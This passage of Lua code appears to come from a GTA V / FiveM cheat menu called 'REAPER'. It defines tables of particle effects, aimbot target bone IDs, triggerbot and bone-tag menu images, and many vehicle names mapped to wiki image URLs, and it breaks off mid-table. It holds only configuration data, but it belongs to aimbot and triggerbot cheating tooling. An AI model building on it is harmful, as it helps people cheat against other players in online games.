    __REAPER1__.T.ParticleAmmoParticles = {{dict = 'des_fib_floor', name = 'ent_ray_fbi5a_ramp_explosion'}, {dict = 'des_trailerpark', name = 'ent_ray_trailerpark_explosion_L'}, {dict = 'scr_rcbarry2', name = 'scr_clown_bul'}, {dict = 'scr_rcbarry2', name = 'scr_clown_appears'}, {dict = 'scr_indep_fireworks', name = 'scr_indep_firework_fountain'}, {dict = 'proj_xmas_firework', name = 'scr_firework_xmas_ring_burst_rgw'}, {dict = 'scr_rcbarry1', name = 'scr_alien_teleport'}, {dict = 'scr_rcbarry1', name = 'scr_alien_disintegrate'}, {dict = 'scr_exile3', name = 'water_splash_ped'}, {dict = 'cut_iaaj', name = 'bullet_tracer_xm_thruster_mg'}, {dict = 'scr_mp_creator', name = 'scr_mp_splash'}, }
    __REAPER1__.T.AimbotBones = {31086, 39317, 24818, 24817, 24816, 23553, 45509, 40269, 61163, 28252, 58271, 51826, 14201, 52301}
    __REAPER1__.T.BonetagImages = {'https://i.imgur.com/6MwdzSA.png', 'https://i.imgur.com/jSmNc4Q.png', 'https://i.imgur.com/WKXu9Fm.png', 'https://i.imgur.com/g5jxf8P.png', 'https://i.imgur.com/81d7TTl.png', 'https://i.imgur.com/RvEnwby.png', 'https://i.imgur.com/JX0mj5t.png', 'https://i.imgur.com/Jp3WvAh.png', 'https://i.imgur.com/DhRhmfk.png', 'https://i.imgur.com/sq8d9xw.png', 'https://i.imgur.com/RAkTxmd.png', 'https://i.imgur.com/SbxBDC1.png', 'https://i.imgur.com/LlKarRo.png', 'https://i.imgur.com/qAw7tmx.png', 'https://i.imgur.com/sGV6X3q.png'}
    __REAPER1__.T.TriggerbotImages = {'https://i.imgur.com/hT5aaf1.png', 'https://i.imgur.com/EsQexkQ.png', 'https://i.imgur.com/P0KX7g3.png', 'https://i.imgur.com/kilaH23.png', 'https://i.imgur.com/1mJLNHW.png', 'https://i.imgur.com/HaXJvr9.png', 'https://i.imgur.com/vghSNvw.png', 'https://i.imgur.com/FeJ402x.png', 'https://i.imgur.com/RsUwnN1.png', 'https://i.imgur.com/y2dV5Ip.png', 'https://i.imgur.com/u64cgq1.png', 'https://i.imgur.com/ujAcFc8.png', 'https://i.imgur.com/tpyKn6u.png', 'https://i.imgur.com/blaDxHM.png'}
    __REAPER1__.T.BulletTrace = {}
    __REAPER1__.T.ImpactTrace = {}
    __REAPER1__.T.Vehicle2stepLocation = {"exhaust", "exhaust_2", "exhaust_3", "exhaust_4", "exhaust_5", "exhaust_6", "exhaust_7", "exhaust_8", "exhaust_9", "exhaust_10", "exhaust_11", "exhaust_12", "exhaust_13", "exhaust_14", "exhaust_15", "exhaust_16" }
    __REAPER1__.T.VehiclesImages = {['Dinghy'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/92/Dinghy-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180706112610',['Dinghy2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/11/Dinghy2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180706112840',['Dinghy3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bf/Dinghy3-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180706113418',['Dingh4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/85/Dinghy4-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180706114127',['Jetmax'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/98/Jetmax-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180505133018',['Marquis'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3b/Marquis-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180712102103',['Seashark'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d0/Seashark-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180702161612',['Seashark2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f4/Seashark2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180702161924',['Seashark3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/ed/Seashark3-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180702162330',['Speeder'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/96/Speeder-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714093452',['Speeder2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9d/Speeder2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714093712',['Squalo'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c6/Squalo-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714095227',['Submersible'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/79/Submersible-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180622155939',['Submersible2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b9/Kraken-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180622151007',['Suntrap'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/86/Suntrap-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714100023',['Toro'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/76/Toro-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714101134',['Toro2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c2/Toro2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714115609',['Tropic'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/37/Tropic-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714102850',['Tropic2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6b/Tropic2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180714103146',['Tug'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/86/Tug-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180704095106',['Benson'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/47/Benson-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151212193202',['Biff'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0f/Biff-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151218200510',['Cerberus'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bf/ApocalypseCerberus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181219161044',['Cerberus2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/84/FutureShockCerberus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181219161211',['Cerberus3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d8/NightmareCerberus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181219161401',['Hauler'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e4/Hauler-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180610105301',['Hauler2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cf/HaulerCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625161411',['Mule'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d6/Mule-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180809101654',['Mule2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d0/Mule2-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180809101852',['Mule3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/4c/Mule3-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180809102853',['Mule4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/68/MuleCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180809110046',['Packer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/93/Packer-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180610103412',['Phantom'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3b/Phantom-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180610104630',['Phantom2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/ad/PhantomCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625161453',['Phantom3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/59/PhantomWedge-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170108152259',['Pounder'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/39/Pounder-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180610105853',['Pounder2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a3/PounderCustom-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180824172809',['Stockade'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f1/Stockade-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151222190349',['Stockade3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a5/Stockade3-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180610111550',['Terbyte'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9e/Terbyte-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180730103420', ['Asbo'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/69/Asbo-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20191214082356',['Blista'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/92/Blista-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160927173710',['Brioso'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2c/BriosoRA-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160712185812',['Dilettante'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/28/Dilettante-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190308221022',['Dilettante2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/67/Dilettante2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190308221115',['Kanjo'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/39/BlistaKanjo-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20191214214129',['Issi2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7d/IssiUp-GTAV-front.png/revision/latest/scale-to-width-down/350?cb=20160305190350',['Issi3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cc/IssiClassic-GTAO-Frontquarter.png/revision/latest/scale-to-width-down/210?cb=20180715003816',['Issi4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0a/ApocalypseIssi-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222113550',['Iss5'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c8/FutureShockIssi-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222114330',['Issi6'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e2/NightmareIssi-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181222115040',['Panto'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0c/Panto-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190308223006',['Prarire'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7d/Prairie-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160429183651',['Rhapsody'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/be/Rhapsody-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190308233634',['Cogcabrio'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3b/CogCabrio-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331161226',['Exemplar'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d3/Exemplar-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331162033',['F620'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f8/F620-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20160929162327',['Felon'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/4f/Felon-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331162722',['Felon2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/ed/FelonGT-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331164107',['Jackal'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/de/Jackal-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20160101175959',['Oracle'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2b/Oracle-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331164837',['Oracle2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7e/OracleXS-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180331170256',['Sentinel'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8e/Sentinel-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180404155524',['Sentinel2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/ca/SentinelXS-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181011163542',['Windsor'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f4/Windsor-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190316223931',['Windsor2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/59/WindsorDrop-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190322201246',['Zion'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e3/ZionXS-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180404165131',['Zion2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/89/ZionCabrio-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20160102142208',['Bmx'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/64/BMX-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018175629',['Cruiser'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bd/Cruiser-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018175937',['Fixter'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/74/Fixter-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018180352',['Scorcher'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/be/Scorcher-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018180738',['Tribike'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3b/WhippetRaceBike-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018181058',['Tribike2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/53/EndurexRaceBike-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018180230',['Tribike3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5d/Tri-CyclesRaceBike-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20161018181013',['Ambulance'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6f/Ambulance-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602080724',['Fbi'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7d/FIB-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602082043',['Fbi2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c0/FIBGranger-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602084140',['Firetruk'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b9/FireTruck-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180531095021',['Lguard'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bf/Lifeguard-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602095733',['Pbus'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b3/PrisonBus-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602114823',['Police'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f5/PoliceCruiser-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602091344',['Police2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3a/PoliceBuffalo-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602085637',['Police3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/15/Interceptor-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602093314',['Police4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/39/UnmarkedCruiser-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602094239',['Policeold1'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/82/PoliceRancher-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602103143',['Policeold2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/45/PoliceOld2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602104544',['Policet'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b6/PoliceTransporter-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20151119182738',['Policeb'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/14/PoliceBike-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602101530',['Polmav'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/23/PoliceMaverick-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180529135248',['Pranger'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cc/ParkRanger-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20151203185453',['Predator'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cb/PolicePredator-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20180529134458',['Riot'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/a4/PoliceRiot-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180601154906',['Riot2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/a/ac/RCV-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180408155048',['Sheriff'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/df/SheriffCruiser-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602112345',['Sheriff2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b9/SheriffSUV-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180602113016',['Akula'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/1f/Akula-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190124205006',['Annihilator'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/12/Annihilator-GTAO-frontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160429164938',['Buzzard'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/03/Buzzard-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160929162201',['Buzzard2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/28/BuzzardAttackChopper-GTAV-frontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160813142009',['Cargobob'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/72/Cargobob-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180613090336',['Cargobob2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/20/Cargobob2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180613090542',['Cargobob3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e0/Cargobob3-GTAV-front.png/revision/latest/scale-to-width-down/270?cb=20161111195058',['Cargobob4'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/84/Cargobob4-GTAO-front.png/revision/latest/scale-to-width-down/270?cb=20151216172624',['Frogger'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b9/Frogger-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160627102729',['Frogger2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7b/Frogger2-GTAV-front.png/revision/latest/scale-to-width-down/185?cb=20161111195701',['Havok'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8a/Havok-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180615114643',['Hunter'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/20/FH1Hunter-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180404165721',['Maverick'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/06/Maverick-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180712103408',['Savage'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c7/Savage-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180614094803',['Seasparrow'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b8/SeaSparrow-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180605104800',['Skylift'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/64/Skylift-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180623075549',['Supervolito'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/70/SuperVolito-GTAO-frontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160429164054',['Supervolito2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/02/SuperVolitoCarbon-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160216143720',['Swift'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/9c/SwiftClassic-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20160117175814',['Swift2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/4/4d/SwiftDeluxe-GTAV-front.png/revision/latest/scale-to-width-down/210?cb=20160117170332',['Valkyrie'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/8f/Valkyrie-GTAO-frontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160429164518',['Valkyrie2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/77/ValkyrieMOD0-GTAO-front.png/revision/latest/scale-to-width-down/210?cb=20151216172704',['Volatus'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/7e/Volatus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180609095935',['Bulldozer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/1/19/Dozer-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160928192349',['Cutter'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/64/Cutter-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161015120016',['Dump'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/bd/Dump-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20151122132816',['Flatbed'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d3/Flatbed-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151212193648',['Guardian'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/3c/Guardian-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181207112802',['Handler'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b6/DockHandler-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160308175207',['Mixer'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/fe/Mixer2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151220145442',['Mixer2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/31/Mixer-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180609155159',['Rubble'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/8/88/Rubble-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160626152904',['Tiptruck'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/00/Tipper-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180609160624',['Tiptruck2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/7/74/Tipper2-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180609160100',['Apc'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/37/APC-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625153945',['Barracks'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e6/Barracks-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20151220121734',['Barracks2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cf/BarracksSemi-GTAV-front2.png/revision/latest/scale-to-width-down/210?cb=20151220121815',['Barracks3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/91/Barracks3-GTAO-front.png/revision/latest/scale-to-width-down/270?cb=20160916175322',['Barrage'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/08/Barrage-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180504132027',['Chernobog'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/5/5e/Chernobog-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180307215403',['Crusader'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/61/Crusader-GTAV-FrontQuarter.jpg/revision/latest/scale-to-width-down/210?cb=20151210204912',['Halftrack'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2d/Halftrack-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625154326',['Khanjali'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d0/Khanjali-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180504134540',['Minitank'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/3/36/Invade%26PersuadeTank-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20200410194952',['Rhino'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d1/Rhino-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180504154553',['Scarab'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/2/2b/ApocalypseScarab-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181220123037',['Scarab2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/9/92/FutureShockScarab-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181220124648',['Scarab3'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/6c/NightmareScarab-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20181220125435',['Thruster'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/00/Thruster-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20180504141507',['Trailersmall2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/c7/AntiAircraftTrailer-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20170625160655',['Akuma'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d7/Akuma-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190309193603',['Avarus'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f2/Avarus-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007174507',['Bagger'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/0/0a/Bagger-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160927162020',['Bati'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/6/65/Bati801-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190309194925',['Bati2'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/e9/BatiCustom-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160317181821',['BF400'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/d/d4/BF400-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160712185659',['Carbonrs'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/f/f5/CarbonRS-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161015115507',['Chimera'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/c/cc/Chimera-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20161007174652',['Cliffhanger'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/b/b8/Cliffhanger-GTAO-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20160726232130',['Daemon'] = 'https://vignette.wikia.nocookie.net/gtawiki/images/e/ea/Daemon-GTAV-FrontQuarter.png/revision/latest/scale-to-width-down/210?cb=20190309203608',['Daemon2'] = 